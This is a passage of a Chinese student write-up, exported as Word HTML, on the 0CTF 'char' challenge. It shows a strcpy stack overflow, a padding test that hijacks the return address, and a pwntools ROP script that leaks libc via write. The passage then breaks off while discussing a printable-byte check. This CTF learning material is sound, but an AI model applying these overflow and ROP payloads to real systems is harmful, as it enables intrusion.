<w:LsdException Locked="false"  Priority="71"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Shading Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="72"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful List Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="73"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Grid Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="60"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Shading Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="61"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light List Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="62"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Grid Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="63"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 1 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="64"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 2 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="65"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 1 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="66"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 2 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="67"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 1 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="68"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 2 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="69"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 3 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="70"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Dark List Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="71"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Shading Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="72"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful List Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="73"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Grid Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="60"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Shading Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="61"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light List Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="62"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Grid Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="63"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 1 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="64"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 2 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="65"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 1 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="66"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 2 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="67"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 1 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="68"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 2 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="69"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 3 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="70"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Dark List Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="71"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Shading Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="72"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful List Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="73"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Grid Accent 6" ></w:LsdException>
</w:LatentStyles></xml><![endif]--><style>
@font-face{
font-family:"Times New Roman";
}

@font-face{
font-family:"宋体";
}

@font-face{
font-family:"DejaVu Sans";
}

@font-face{
font-family:"Calibri";
}

@font-face{
font-family:"微软雅黑";
}

@font-face{
font-family:"Consolas";
}

@list l0:level1{
mso-level-start-at:3;
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:15.6000pt;
mso-level-number-position:left;
margin-left:0.0000pt;
text-indent:0.0000pt;
font-family:'Times New Roman';}

p.MsoNormal{
mso-style-name:正文;
mso-style-parent:"";
margin:0pt;
margin-bottom:.0001pt;
mso-pagination:none;
text-align:justify;
text-justify:inter-ideograph;
font-family:Calibri;
mso-fareast-font-family:宋体;
mso-bidi-font-family:'Times New Roman';
font-size:10.5000pt;
mso-font-kerning:1.0000pt;
}

span.10{
font-family:'Times New Roman';
}

span.15{
font-family:'Times New Roman';
color:rgb(0,0,255);
text-decoration:underline;
text-underline:single;
}

p.MsoHeader{
mso-style-name:页眉;
margin:0pt;
margin-bottom:.0001pt;
border-top:none;
mso-border-top-alt:none;
border-right:none;
mso-border-right-alt:none;
border-bottom:none;
mso-border-bottom-alt:none;
border-left:none;
mso-border-left-alt:none;
padding:1pt 4pt 1pt 4pt ;
layout-grid-mode:char;
mso-pagination:none;
text-align:justify;
text-justify:inter-ideograph;
font-family:Calibri;
mso-fareast-font-family:宋体;
mso-bidi-font-family:'Times New Roman';
font-size:9.0000pt;
mso-font-kerning:1.0000pt;
}

p.MsoFooter{
mso-style-name:页脚;
margin:0pt;
margin-bottom:.0001pt;
layout-grid-mode:char;
mso-pagination:none;
text-align:left;
font-family:Calibri;
mso-fareast-font-family:宋体;
mso-bidi-font-family:'Times New Roman';
font-size:9.0000pt;
mso-font-kerning:1.0000pt;
}

span.msoIns{
mso-style-type:export-only;
mso-style-name:"";
text-decoration:underline;
text-underline:single;
color:blue;
}

span.msoDel{
mso-style-type:export-only;
mso-style-name:"";
text-decoration:line-through;
color:red;
}

table.MsoNormalTable{
mso-style-name:普通表格;
mso-style-parent:"";
mso-style-noshow:yes;
mso-tstyle-rowband-size:0;
mso-tstyle-colband-size:0;
mso-padding-alt:0.0000pt 5.4000pt 0.0000pt 5.4000pt;
mso-para-margin:0pt;
mso-para-margin-bottom:.0001pt;
mso-pagination:widow-orphan;
font-family:'Times New Roman';
font-size:10.0000pt;
mso-ansi-language:#0400;
mso-fareast-language:#0400;
mso-bidi-language:#0400;
}
@page{mso-page-border-surround-header:no;
	mso-page-border-surround-footer:no;}@page Section0{
margin-top:72.0000pt;
margin-bottom:72.0000pt;
margin-left:90.0000pt;
margin-right:90.0000pt;
size:595.3000pt 841.9000pt;
layout-grid:15.6000pt;
}
div.Section0{page:Section0;}</style></head><body style="tab-interval:21pt;text-justify-trim:punctuation;" ><!--StartFragment--><div class="Section0"  style="layout-grid:15.6000pt;" ><p class=MsoNormal  align=center  style="text-align:center;" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >WriteupTo0ctf-char</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  align=center  style="text-align:center;" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >肖临风</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  align=center  style="text-align:center;" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >指导老师：乐德广</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  align=center  style="text-align:center;" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >2019.6</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  align=center  style="text-align:center;" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >概述：参加了很多</font>CTF比赛，发现ROP还是非常常见并且最需要熟练掌握的技术，所以做了一下之前的经典例题。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >关键词：中断调用、</font>ROP</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >环境</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >0ctf的char题</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >将</font>libc.so放入/home/char中</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >目录：</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >0x00&nbsp;逆向分析</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >0x01&nbsp;ROP</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >0x02&nbsp;拓展思路</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >0x00&nbsp;逆向分析</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >主函数</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >scanf不存在栈溢出</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="290"  height="266"  src="WriteupTo0ctf-char.files/WriteupTo0ctf-char231.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >return&nbsp;sub_8048678函数中的strcpy使得dest数组超界，导致栈溢出。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >因为存在</font>write函数，一开始的思路是ROP泄露libc地址（版本已知）</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="246"  height="88"  src="WriteupTo0ctf-char.files/WriteupTo0ctf-char316.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >Padding=</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >"A"*32</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >+</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >"BBBB"</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >程序成功跳转到了</font>0x42424242</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >理论上已经直接可以</font>ROP了，写了下面的代码，可以泄露libc地址。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >当观察源代码，发现程序已经将</font>libc映射到了内存0x5555E000中，我们可以无需泄露地址就能调用函数。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >不过事情哪有这么简单呢。</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="374"  height="57"  src="WriteupTo0ctf-char.files/WriteupTo0ctf-char463.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >from&nbsp;pwn&nbsp;import&nbsp;*</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >#context.log_level='Debug'</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >p=process('./char')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >gdb.attach(p,'b&nbsp;*0x08048692')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >libc=ELF('libc.so')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >elf=ELF('char')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >main_addr=0x08048693</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >write_plt=elf.plt['write']</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >print&nbsp;'write_plt='+hex(write_plt)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >write_got=elf.got['write']</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >print&nbsp;'write_got='+hex(write_got)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >p.recvuntil('GO&nbsp;:&nbsp;)&nbsp;\n')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload="A"*32</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >#payload+="BBBB"</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >p.sendline(payload)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >p.interactive()</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="214"  height="70"  src="WriteupTo0ctf-char.files/WriteupTo0ctf-char907.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >但是程序没有跳转到</font>write，因为main函数中的检查机制check。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >每个字节必须在</font>31到126的范围内。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="268"  height="99"  src="WriteupTo0ctf-char.files/WriteupTo0ctf-char964.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><img width="228"  height="52"  src="WriteupTo0ctf-char.files/WriteupTo0ctf-char967.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span 